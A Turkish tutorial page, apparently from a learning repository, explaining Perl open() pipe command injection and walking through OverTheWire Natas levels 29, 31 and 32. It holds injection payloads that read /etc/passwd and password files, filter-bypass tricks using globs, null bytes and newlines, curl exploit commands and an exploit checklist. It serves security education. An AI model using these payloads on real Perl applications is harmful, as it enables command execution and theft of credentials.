# 🌐 Web Güvenliği — Perl'de RCE (open() Injection)

> Perl'de `open(FILE, $filename)` bir dosya açar.
> Ama `$filename` `|` ile başlar veya biterse, komut çalıştırır.

---

## 📋 İçindekiler

- [Perl open() Fonksiyonu](#perl-open-fonksiyonu)
- [Pipe ile Komut Çalıştırma](#pipe-ile-komut-çalıştırma)
- [Filtre Bypass Teknikleri](#filtre-bypass-teknikleri)
- [Glob ile Bypass](#glob-ile-bypass)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Perl open() Fonksiyonu

Perl'de dosya açmanın klasik yolu:

```perl
open(FILE, $filename) or die "Cannot open: $!";
while (<FILE>) {
    print $_;
}
close(FILE);
```

Normal kullanımda `$filename` bir dosya yoludur. Ama Perl'in `open()` fonksiyonu özel bir özelliğe sahiptir.

---

## Pipe ile Komut Çalıştırma

Perl'de `open()` fonksiyonu, dosya adı `|` karakteriyle **bitiyorsa** komutu çalıştırır:

```perl
open(FILE, "ls -la |")    # ls komutunu çalıştır, çıktısını oku
open(FILE, "cat /etc/passwd |")   # /etc/passwd oku

# Veya başında | ile (write mode):
open(FILE, "| mail user@example.com")   # komuta yaz
```

Yani `$filename = "cat /etc/natas_webpass/natas30 |"` → şifre okunur!

---

## Filtre Bypass Teknikleri

Natas 29, "natas" kelimesini ve bazı karakterleri filtreler.

### Natas Filtresi

```perl
if($. =~ /natas/) {
    print "filtered";
}
```

`natas` kelimesi içeren dosya adları reddedilir.

### Glob (*) ile Bypass

Perl'de ve shell'de `*` glob karakteri eşleşen dosyaları listeler:

```
/etc/natas_webpass/natas30
```

`natas` filtreli ama glob kullanabiliriz:

```perl
open(FILE, "cat /etc/natas_webpass/nat* |")
# nat* → natas30 ile eşleşir
```

Veya daha spesifik:

```
/etc/natas_webpass/natas3?       → natas30-39 arası
/etc/natas_webpass/natas30       → direkt (natas filtresi varsa)
```

### Null Byte ile Bypass

```
filename = "cat /etc/natas_webpass/natas30 |\0"
```

Bazı durumlarda null byte filtreyi karıştırabilir.

---

## Natas'ta Kullanım

### Natas 29 — Perl CGI open() Injection

**Kaynak kod (Perl CGI):**

```perl
#!/usr/bin/perl
use CGI qw(:standard);

my $file = param('file');

# Filtre: "natas" kelimesi varsa reddet
if ($file =~ /natas/) {
    print "filtered";
} else {
    open(FILE, $file) or print "Error";
    while (<FILE>) {
        print $_;
    }
    close(FILE);
}
```

**Exploit — Glob ile:**

```
file = cat /etc/natas_webpass/natas30 |
```

Ama "natas" filtreli. Glob kullan:

```
file = cat /etc/natas_webpass/nat?s30 |
```

`nat?s30` → `natas30` ile eşleşir (`?` tek karakter wildcard).

**curl ile:**

```bash
curl -u natas29:[şifre] \
     --data-urlencode "file=cat /etc/natas_webpass/natas30 |" \
     "http://natas29.natas.labs.overthewire.org/index.pl"
```

Veya glob ile:

```bash
curl -u natas29:[şifre] \
     --data-urlencode "file=cat /etc/natas_webpass/nat?s30 |" \
     "http://natas29.natas.labs.overthewire.org/index.pl"
```

---

### Natas 31 — Perl open() + Newline

**Kaynak kod:**

```perl
my $file = param('file');
open(FILE, $file) or die;
while (<FILE>) { print $_; }
```

Newline karakteri ile komut enjekte etme:

```
file = /etc/passwd%0acat /etc/natas_webpass/natas32 |
```

`%0a` → `\n` → Perl bunu ayrı komut olarak yorumlayabilir.

---

### Natas 32 — Ekstra Filtreler

Daha fazla filtre varsa:

```perl
# Hem natas hem bazı özel karakterler filtrelenmiş
```

Farklı glob kombinasyonları:

```bash
# /etc/natas_webpass/ dizinini listele
file = ls /etc/natas_webpass/ |

# Wildcard kombinasyonları
file = cat /etc/natas_webpass/natas3[0-9] |
file = cat /etc/natas_webpass/nata??? |
```

---

### Perl open() — Kontrol Listesi

```
Tespit:
  ☐ Uygulama Perl CGI mi? (.pl uzantısı)
  ☐ Parametre dosya adı olarak kullanılıyor mu?
  ☐ open(), opendir() kullanılıyor mu?

Exploit:
  ☐ Dosya adına | ekle: "cat /etc/passwd |"
  ☐ Glob kullan: nat?s30, nata*
  ☐ "natas" filtresi varsa: nat?s veya nata? veya na*s
  ☐ Newline ile çoklu komut: "%0akomut |"
```

---

## 🔗 Kaynaklar

- [Perl — open()](https://perldoc.perl.org/functions/open)
- [The Perl Jam 2 — Netanel Rubin](https://www.blackhat.com/docs/eu-14/materials/eu-14-Rubin-The-Perl-Jam-Exploiting-A-20-Year-Old-Vulnerability.pdf)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

**Önceki konu:** [20_ecb_mode_zafiyeti.md](./20_ecb_mode_zafiyeti.md)
**Sonraki konu:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
